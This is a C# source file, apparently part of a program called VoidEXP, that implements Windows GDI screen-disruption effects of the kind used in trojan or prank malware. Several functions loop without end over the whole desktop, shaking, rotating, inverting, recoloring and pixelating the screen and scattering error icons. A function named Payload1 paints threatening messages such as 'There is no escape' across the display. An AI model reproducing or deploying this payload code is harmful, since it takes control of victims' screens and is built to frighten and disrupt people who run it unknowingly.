using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Drawing;
using System.Drawing.Imaging;
using Vanara.PInvoke;
using static Vanara.PInvoke.User32;
using static Vanara.PInvoke.Kernel32;
using static Vanara.PInvoke.Gdi32;
using static Vanara.PInvoke.Gdi32.RasterOperationMode;
using static VoidEXP.RGBImport;
using static VoidEXP.RGBImport.rgb;
using System.Runtime.InteropServices;

namespace VoidEXP
{
    class GDI
    {
        public static void GDI1()
        {

            Random rand = new Random();
            int i = 0;
            while (true)
            {
                var dc = GetDC(HWND.NULL);
                var dcC = CreateCompatibleDC(dc);
                var hbitmap = CreateCompatibleBitmap(dc, w, h);
                var oldbitmap = SelectObject(dcC, hbitmap);
                BitBlt(dcC, 0, 0, w, h, dc, 0, 0, RasterOperationMode.SRCCOPY);
                int offsetX = rand.Next(-4, 4);
                int offsetY = rand.Next(-4, 4);
                i += 4;

                BitBlt(dc, offsetX, offsetY, w, h, dc, 0, 0, RasterOperationMode.SRCCOPY);
                if(rand.Next(8) == 5)
                {
                    RedrawWindow(HWND.NULL, null, HRGN.NULL,
RedrawWindowFlags.RDW_INVALIDATE |
RedrawWindowFlags.RDW_ERASE |
RedrawWindowFlags.RDW_ALLCHILDREN);
                }
                SelectObject(dcC, oldbitmap);
                DeleteObject(hbitmap);
                DeleteDC(dcC);
                ReleaseDC(HWND.NULL, dc);
                Sleep(10);
            }
        }

        public static void GDI2()
        {

           
            Random rand = new Random();
            int ee = 0;

            BITMAPINFO bmi = new BITMAPINFO();
            
            bmi.bmiHeader.biSize = (uint)Marshal.SizeOf(bmi);
            bmi.bmiHeader.biWidth = w;
            bmi.bmiHeader.biHeight = -h;
            bmi.bmiHeader.biPlanes = 1;
            bmi.bmiHeader.biBitCount = 32;
            bmi.bmiHeader.biCompression = 0;
            
            while (true)
            {
                var dc = GetDC(IntPtr.Zero);
                var memdc = CreateCompatibleDC(dc);
                var bitmap = CreateDIBSection(memdc, bmi, DIBColorMode.DIB_RGB_COLORS, out IntPtr pb, IntPtr.Zero, 0);
                var oldBitmap = SelectObject(memdc, bitmap);
                unsafe
                {
                    BitBlt(memdc, 0, 0, w, h, dc, 0, 0, RasterOperationMode.SRCCOPY);

                    byte* ptr = (byte*)pb.ToPointer();



                    ee = 0;
                    for (int xx = 0; xx < w; xx++)
                    {
                        for (int yy = 0; yy < h; yy++)
                        {
                            hsv hsv = new hsv(new rgb(ptr[ee + 2], ptr[ee + 1], ptr[ee]));

                            hsv.changehue(ee);

                            
                            rgb rgb = new rgb(hsv);

                            ptr[ee] += rgb.r;
                            ptr[ee + 1] += rgb.g;
                            ptr[ee + 2] += rgb.b;


                            ee += 4;
                        }
                    }




                    if (rand.Next(6) == 3)
                    {

                        BitBlt(dc, 0, 0, w, h, memdc, 0, 0, RasterOperationMode.SRCCOPY);

                    }

                    else if (rand.Next(6) == 4)
                    {

                        PatBlt(dc, 0, 0, w, h, PATINVERT);

                    }
                    else if (rand.Next(6) == 2)
                    {
                        var brush = CreateSolidBrush(new COLORREF((byte)rand.Next(255), (byte)rand.Next(255), (byte)rand.Next(255)));
                        SelectObject(dc, brush);
                        PatBlt(dc, 0, 0, w, h, PATINVERT);
                        DeleteObject(brush);
                    }
                    else
                    {
                        RedrawWindow(HWND.NULL, null, HRGN.NULL,
    RedrawWindowFlags.RDW_INVALIDATE |
    RedrawWindowFlags.RDW_ERASE |
    RedrawWindowFlags.RDW_ALLCHILDREN);

                    }
                    SelectObject(memdc, oldBitmap);
                    DeleteObject(bitmap);
                    DeleteDC(memdc);
                    ReleaseDC(IntPtr.Zero, dc);
                }

                

                


                Sleep(10);
                
                

            }
        }
        public static void GDI3()
        {
            int w = GetSystemMetrics(0);
            int h = GetSystemMetrics((SystemMetric)1);
            Random rand = new Random();
            int i = 0;
            Point[] point = new Point[3];
            BLENDFUNCTION blend = new BLENDFUNCTION
            {
                BlendOp = (byte)0,
                BlendFlags = 0,
                SourceConstantAlpha = 20,
                AlphaFormat = 0
            };
            while (true)
            {
                
                RECT rc = new RECT(0, 0, w, h);
                var dc = GetDC(HWND.NULL);
                var hdc = CreateCompatibleDC(dc);
                var hbit = CreateCompatibleBitmap(dc, w, h);
                var holdbit = SelectObject(hdc, hbit);
                BitBlt(hdc, 0, 0, w, h, dc, 0, 0, RasterOperationMode.SRCCOPY);
                
      
                    
                    if (i == 1)
                    {
                        point[0].X = (rc.left + 30) + 0;
                        point[0].Y = (rc.top - 30) + 0;

                        point[1].X = (rc.right + 30) + 0;
                        point[1].Y = (rc.top + 30) + 0;

                        point[2].X = (rc.left - 30) + 0;
                        point[2].Y = (rc.bottom - 30) + 0;
                        i = 0;

                    }
                    else
                    {
                        point[0].X = (rc.left - 30) + 0;
                        point[0].Y = (rc.top + 30) + 0;

                        point[1].X = (rc.right - 30) + 0;
                        point[1].Y = (rc.top - 30) + 0;

                        point[2].X = (rc.left + 30) + 0;
                        point[2].Y = (rc.bottom + 30) + 0;
                        i = 1;

                    }

                

                PlgBlt(dc, point, dc, rc.left, rc.top, (rc.right - rc.left), (rc.bottom + rc.top), HBITMAP.NULL, 0, 0);
                AlphaBlend(dc, 0, 0, w, h, hdc, 0, 0, w, h, blend);
                SelectObject(hdc, holdbit);
                DeleteObject(hbit);
                DeleteDC(hdc);
                ReleaseDC(HWND.NULL, dc);
               

            }

        }
        public static void distorc()
        {
            
            int screenWidth = GetSystemMetrics(0);
            int screenHeight = GetSystemMetrics((SystemMetric)1);

            double time = 0;

            while (true)
            {
                IntPtr hdc = GetDC(IntPtr.Zero);
                for (int y = 0; y < screenHeight; y++)
                {
                    int offset = (int)(Math.Sin((y + time) * 1) * 5);
                    BitBlt(hdc, offset, y, screenWidth, 2, hdc, 0, y, SRCCOPY);
                }

                time += 1;
                DeleteDC(hdc);
                Sleep(30);
            }
        }
        public static void triangle()
        {

            int xx = GetSystemMetrics(0);
            int yy = GetSystemMetrics((SystemMetric)1);
            int centerx = xx / 2;
            int centery = yy / 2;
            double angle = 0;
            double cosA = Math.Cos(angle);
            double sinA = Math.Sin(angle);
            Random rand = new Random();
            Point abu = new Point(rand.Next(xx), rand.Next(yy));
            HICON icon = LoadIcon(HINSTANCE.NULL, IDI_ERROR);
            while (true)
            {
                HDC dc = GetDC(IntPtr.Zero);
                
                angle += 0.00010;
                cosA = Math.Cos(angle);
                sinA = Math.Sin(angle);
                Point[] ver =
                {
                    new Point(centerx + (int)((0) * sinA), centery + (int)((50 - centery) * cosA)),
                    new Point(centerx + (int)((50 - centerx) * sinA), centery + (int)((yy - 50 - centery) * cosA)),
                    new Point((int)(xx + 50 - centerx ), centery + (int)((yy - 50 - centery) * cosA))
                };

                Point abuu = ver[rand.Next(3)];
                abu.X = (abu.X + abuu.X) / 2;
                abu.Y = (abu.Y + abuu.Y) / 2;
                DrawIcon(dc, abu.X, abu.Y, icon);
                if (rand.Next(1000) == 50)
                {
                    RedrawWindow(HWND.NULL, null, HRGN.NULL,
RedrawWindowFlags.RDW_INVALIDATE |
RedrawWindowFlags.RDW_ERASE |
RedrawWindowFlags.RDW_ALLCHILDREN);
                }
                DeleteDC(dc);
                
            }

        }
        public static void GDI6()
        {


            Random rand = new Random();
            int ee = 0;

            BITMAPINFO bmi = new BITMAPINFO();

            bmi.bmiHeader.biSize = (uint)Marshal.SizeOf(bmi);
            bmi.bmiHeader.biWidth = w;
            bmi.bmiHeader.biHeight = -h;
            bmi.bmiHeader.biPlanes = 1;
            bmi.bmiHeader.biBitCount = 32;
            bmi.bmiHeader.biCompression = 0;
            int centerx = w / 2;
            int centery = h / 2;
            var raio = w + h;

            while (true)
            {
                if (rand.Next(10) == 9)
                {
                    var dc = GetDC(IntPtr.Zero);
                    var memdc = CreateCompatibleDC(dc);
                    var bitmap = CreateDIBSection(memdc, bmi, DIBColorMode.DIB_RGB_COLORS, out IntPtr pb, IntPtr.Zero, 0);
                    var oldBitmap = SelectObject(memdc, bitmap);
                    unsafe
                    {
                        BitBlt(memdc, 0, 0, w, h, dc, 0, 0, RasterOperationMode.SRCCOPY);

                        byte* ptr = (byte*)pb.ToPointer();



                        ee = 0;
                        for (int xx = 0; xx < w; xx++)
                        {
                            for (int yy = 0; yy < h; yy++)
                            {
                                int dx = xx - centerx;
                                int dy = yy - centery;
                                ee = ((yy * w + xx) * 4);
                                if ((dx * dx) + (dy * dy) <= (raio * raio))
                                {
                                    rgb cores = new rgb(ptr[ee + 2], ptr[ee + 1], ptr[ee]);
                                    hsv colorhsv = new hsv(cores);

                                    colorhsv.changehue((((dx * dx) + (dy * dy)) / rand.Next(1, 3)) * rand.Next(1, 3));

                                    rgb rcolor = new rgb(colorhsv);


                                    ptr[ee] = rcolor.r;
                                    ptr[ee + 1] = rcolor.g;
                                    ptr[ee + 2] = rcolor.b;

                                }
                            }
                        }



                        if (rand.Next(3) == 2)
                        {
                            BitBlt(dc, 0, 0, w, h, memdc, 0, 0, SRCCOPY);
                        }
                        else if (rand.Next(3) == 2)
                        {
                            RedrawWindow(HWND.NULL, null, HRGN.NULL,
RedrawWindowFlags.RDW_INVALIDATE |
RedrawWindowFlags.RDW_ERASE |
RedrawWindowFlags.RDW_ALLCHILDREN);
                        }





                        SelectObject(memdc, oldBitmap);
                        DeleteObject(bitmap);
                        DeleteDC(memdc);
                        ReleaseDC(IntPtr.Zero, dc);
                    }
                }



            }
        }

        public static void rotate()
        {

            int w = GetSystemMetrics(0);
            int h = GetSystemMetrics((SystemMetric)1);
            double angle = 0;
            int raio = 5;
            while (true)
            {

                var dc = GetDC(IntPtr.Zero);
                int offx = (int)(Math.Cos(angle) * raio);
                int offy = (int)(Math.Sin(angle) * raio);
                BitBlt(dc, offx, offy, w, h, dc, 0, 0, SRCCOPY);
                DeleteDC(dc);
                angle += 0.5;
                Sleep(15);
            }
        }
        public static void pixel()
        {
            int screenWidth = GetSystemMetrics(0);
            int screenHeight = GetSystemMetrics((SystemMetric)1);
            IntPtr screenDC = GetDC(IntPtr.Zero);

            Random rand = new Random();

            while (true)
            {
                if (rand.Next(10) == 2)
                {
                    int blockSize = rand.Next(6, 20);

                    var memDC = CreateCompatibleDC(screenDC);
                    var bmp = CreateCompatibleBitmap(screenDC, screenWidth, screenHeight);
                    var oldBmp = SelectObject(memDC, bmp);

                    StretchBlt(memDC, 0, 0, screenWidth / blockSize, screenHeight / blockSize,
                               screenDC, 0, 0, screenWidth, screenHeight, SRCCOPY);

                    StretchBlt(screenDC, 0, 0, screenWidth, screenHeight,
                               memDC, 0, 0, screenWidth / blockSize, screenHeight / blockSize, SRCCOPY);

                    SelectObject(memDC, oldBmp);
                    DeleteObject(bmp);
                    DeleteDC(memDC);

                    Sleep((uint)rand.Next(1000));
                }
            }
        }

        public static void GDI5()

        {

            var dc = GetDC(IntPtr.Zero);

            var dcC = CreateCompatibleDC(dc);

            var memdc = CreateCompatibleDC(dc);


            Random rand = new Random();

            int ee = 0;

            int offx = 0;

            int offy = 0;

            BITMAPINFO bmi = new BITMAPINFO();



            bmi.bmiHeader.biSize = (uint)Marshal.SizeOf(bmi);

            bmi.bmiHeader.biWidth = w;

            bmi.bmiHeader.biHeight = -h;

            bmi.bmiHeader.biPlanes = 1;

            bmi.bmiHeader.biBitCount = 32;

            bmi.bmiHeader.biCompression = 0;

            var bitmap = CreateDIBSection(memdc, bmi, DIBColorMode.DIB_RGB_COLORS, out IntPtr pb, IntPtr.Zero, 0);

            var bitmapp = CreateCompatibleBitmap(dc, w, h);

            SelectObject(memdc, bitmap);

            var oldbit = SelectObject(dcC, bitmapp);

            while (true)

            {

                ee = 0;

                offx += 20;

                offy += 20;


                unsafe

                {


                    byte* ptr = (byte*)pb.ToPointer();

                    BitBlt(memdc, 0, 0, w, h, dc, 0, 0, SRCCOPY);






                    for (int yy = 0; yy < h; yy++)

                    {

                        for (int xx = 0; xx < w; xx++)

                        {

                            ee = (yy * w + xx) * 4;

                            int fx = xx + offx;

                            int fy = yy + offy;

                            int val = fx ^ fy;

                            int r = val;

                            int g = val;

                            int b = val;





                            hsv hsv = new hsv(new rgb(ptr[ee], ptr[ee + 1], ptr[ee + 2]));
                            hsv.changehue(yy + (val % 256));
                            rgb rgb = new rgb(hsv);


                            ptr[ee] = rgb.b;

                            ptr[ee + 1] = rgb.g;

                            ptr[ee + 2] = rgb.r;











                        }

                    }






                    BitBlt(dc, 0, 0, w, h, memdc, 0, 0, SRCCOPY);




                }

            }

        }
        public static void GDI4()
        {


            Random rand = new Random();
            int ee = 0;

            BITMAPINFO bmi = new BITMAPINFO();

            bmi.bmiHeader.biSize = (uint)Marshal.SizeOf(bmi);
            bmi.bmiHeader.biWidth = w;
            bmi.bmiHeader.biHeight = -h;
            bmi.bmiHeader.biPlanes = 1;
            bmi.bmiHeader.biBitCount = 32;
            bmi.bmiHeader.biCompression = 0;
            int centerx = w / 2;
            int centery = h / 2;
            var raio = w + h;

            while (true)
            {
                if(rand.Next(10) == 9) { 
                var dc = GetDC(IntPtr.Zero);
                var memdc = CreateCompatibleDC(dc);
                var bitmap = CreateDIBSection(memdc, bmi, DIBColorMode.DIB_RGB_COLORS, out IntPtr pb, IntPtr.Zero, 0);
                var oldBitmap = SelectObject(memdc, bitmap);
                unsafe
                    {
                        BitBlt(memdc, 0, 0, w, h, dc, 0, 0, RasterOperationMode.SRCCOPY);

                        byte* ptr = (byte*)pb.ToPointer();



                        ee = 0;
                        for (int xx = 0; xx < w; xx++)
                        {
                            for (int yy = 0; yy < h; yy++)
                            {
                                int dx = xx - centerx;
                                int dy = yy - centery;
                                ee = ((yy * w + xx) * 4);
                                if ((dx * dx) + (dy * dy) <= (raio * raio))
                                {
                                    rgb cores = new rgb(ptr[ee + 2], ptr[ee + 1], ptr[ee]);
                                    hsv colorhsv = new hsv(cores);

                                    colorhsv.changehue(((dx * dx) + (dy * dy)) / 700);

                                    rgb rcolor = new rgb(colorhsv);


                                    ptr[ee] = rcolor.r;
                                    ptr[ee + 1] = rcolor.g;
                                    ptr[ee + 2] = rcolor.b;

                                }
                            }
                        }




                        BitBlt(dc, 0, 0, w, h, memdc, 0, 0, RasterOperationMode.SRCCOPY);





                        SelectObject(memdc, oldBitmap);
                        DeleteObject(bitmap);
                        DeleteDC(memdc);
                        ReleaseDC(IntPtr.Zero, dc);
                    }
                }

                Sleep(10);

            }
        }
        public static void Payload1()
        {
            Random rand = new Random();

            while (true)
            {
                int w = rand.Next(GetSystemMetrics(0)),
    h = rand.Next(GetSystemMetrics((SystemMetric)1));
                var dc = GetDC(HWND.NULL) ;
                var font = CreateFont(40, 0, rand.Next(60), 0, 700, true, true, false, 0, 0, 0, 0, 0, "Arial");

                string[] texts = {"VoidEXP.exe", "The end is near", "There is no escape", "Your pain will soon be over" };
                int index = rand.Next(texts.Length);
                SelectObject(dc, font);
                var color = new COLORREF((byte)rand.Next(255), (byte)rand.Next(255), (byte)rand.Next(255));
                var color2 = new COLORREF((byte)rand.Next(255), (byte)rand.Next(255), (byte)rand.Next(255));
                SetTextColor(dc, color);
                SetBkColor(dc, color2);
                TextOut(dc, w, h, texts[index], texts[index].Length);
                DeleteObject(font);
                ReleaseDC(HWND.NULL,dc);
                Sleep(30);
            }
        }
    }
}
